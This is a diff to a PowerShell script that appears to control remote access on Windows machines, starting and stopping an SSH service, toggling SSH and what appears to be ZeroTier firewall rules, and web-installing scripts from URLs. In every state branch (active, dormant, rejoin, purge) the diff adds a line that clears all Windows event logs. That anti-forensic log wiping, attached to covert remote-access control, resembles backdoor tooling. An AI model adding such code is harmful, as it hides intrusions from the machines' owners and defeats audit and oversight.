@@ -232,6 +232,7 @@ if ($storedCode -ne $null) {
 							Start-ServiceSafe -ServiceName $sshdservice
 							Enable-FirewallRules -ruleName $ztfirewall
 							Enable-FirewallRules -ruleName $sshfirewall
+							Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
 						} -MaxRetries $retryAttempts
                     }
                     "dormant" {
@@ -243,6 +244,7 @@ if ($storedCode -ne $null) {
 							Stop-ServiceSafe -ServiceName $sshdservice
 							Disable-FirewallRules -ruleName $ztfirewall
 							Disable-FirewallRules -ruleName $sshfirewall
+							Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
 						} -MaxRetries $retryAttempts
                     }
                     "rejoin" {
@@ -267,6 +269,7 @@ if ($storedCode -ne $null) {
 							Delete-Directories -directories $ztdatadir
 							web-install -InstallScriptURL $sshinstall
 							web-install -InstallScriptURL $ztinstall
+							Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
 						} -MaxRetries $retryAttempts
                     }
                     "purge" {
@@ -289,6 +292,7 @@ if ($storedCode -ne $null) {
 							Delete-Directories -directories $sshdir
 							Delete-Directories -directories $sshdatadir
 							Delete-Directories -directories $ztdatadir
+							Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
 						} -MaxRetries $retryAttempts
                     }
                 }
